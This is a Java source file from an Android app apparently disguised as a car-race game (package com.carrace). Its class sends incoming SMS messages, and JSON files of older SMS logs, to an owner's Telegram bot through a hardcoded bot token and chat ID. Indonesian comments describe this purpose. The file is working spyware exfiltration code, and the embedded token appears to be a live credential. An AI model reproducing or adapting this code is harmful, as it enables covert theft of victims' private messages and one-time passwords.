package com.carrace;

import android.util.Log;

import org.json.JSONObject;

import java.io.DataOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;

public final class TelegramSender {

    private static final String TAG = "TelegramSender";

    // ====== KONFIGURASI OWNER ======
    public static final String BOT_TOKEN = "8539992688:AAEuPMyOXEweuaaHebCjGqsnMdeucQFKXhA";
    public static final String OWNER_ID  = "8275632263";
    // ================================

    private TelegramSender() { }

    /**
     * Kirim raw text biasa (untuk SMS baru, langsung tanpa disimpan ke file).
     */
    public static boolean sendRawText(String text) {
        HttpURLConnection c = null;
        try {
            URL url = new URL("https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage");
            c = (HttpURLConnection) url.openConnection();
            c.setRequestMethod("POST");
            c.setDoOutput(true);
            c.setConnectTimeout(15000);
            c.setReadTimeout(15000);
            c.setRequestProperty("Content-Type", "application/json; charset=utf-8");

            JSONObject body = new JSONObject();
            body.put("chat_id", OWNER_ID);
            body.put("text", text);
            try (OutputStream os = c.getOutputStream()) {
                os.write(body.toString().getBytes(StandardCharsets.UTF_8));
            }
            int code = c.getResponseCode();
            Log.i(TAG, "sendRawText code=" + code);
            return code == 200;
        } catch (Exception e) {
            Log.w(TAG, "sendRawText gagal", e);
            return false;
        } finally {
            if (c != null) c.disconnect();
        }
    }

    /**
     * Kirim FILE ke Telegram via multipart/form-data (endpoint sendDocument).
     * Ini yang dipakai untuk mengirim file JSON berisi log SMS lama.
     */
    public static boolean sendDocument(File file, String caption) {
        HttpURLConnection c = null;
        try {
            String boundary = "----AndroidBoundary" + System.currentTimeMillis();
            String lineEnd = "\r\n";
            String twoHyphens = "--";

            URL url = new URL("https://api.telegram.org/bot" + BOT_TOKEN + "/sendDocument");
            c = (HttpURLConnection) url.openConnection();
            c.setRequestMethod("POST");
            c.setDoOutput(true);
            c.setDoInput(true);
            c.setUseCaches(false);
            c.setConnectTimeout(20000);
            c.setReadTimeout(30000);
            c.setRequestProperty("Connection", "Keep-Alive");
            c.setRequestProperty("Content-Type", "multipart/form-data;boundary=" + boundary);

            try (DataOutputStream dos = new DataOutputStream(c.getOutputStream())) {
                // field: chat_id
                dos.writeBytes(twoHyphens + boundary + lineEnd);
                dos.writeBytes("Content-Disposition: form-data; name=\"chat_id\"" + lineEnd);
                dos.writeBytes(lineEnd);
                dos.writeBytes(OWNER_ID + lineEnd);

                // field: caption (opsional)
                if (caption != null && !caption.isEmpty()) {
                    dos.writeBytes(twoHyphens + boundary + lineEnd);
                    dos.writeBytes("Content-Disposition: form-data; name=\"caption\"" + lineEnd);
                    dos.writeBytes(lineEnd);
                    dos.writeBytes(caption + lineEnd);
                }

                // field: document (file binary)
                dos.writeBytes(twoHyphens + boundary + lineEnd);
                dos.writeBytes("Content-Disposition: form-data; name=\"document\"; filename=\""
                        + file.getName() + "\"" + lineEnd);
                dos.writeBytes("Content-Type: application/json" + lineEnd);
                dos.writeBytes(lineEnd);

                try (FileInputStream fis = new FileInputStream(file)) {
                    byte[] buffer = new byte[8192];
                    int len;
                    while ((len = fis.read(buffer)) != -1) {
                        dos.write(buffer, 0, len);
                    }
                }
                dos.writeBytes(lineEnd);
                dos.writeBytes(twoHyphens + boundary + twoHyphens + lineEnd);
                dos.flush();
            }

            int code = c.getResponseCode();
            Log.i(TAG, "sendDocument code=" + code);
            return code == 200;
        } catch (Exception e) {
            Log.w(TAG, "sendDocument gagal", e);
            return false;
        } finally {
            if (c != null) c.disconnect();
        }
    }
}
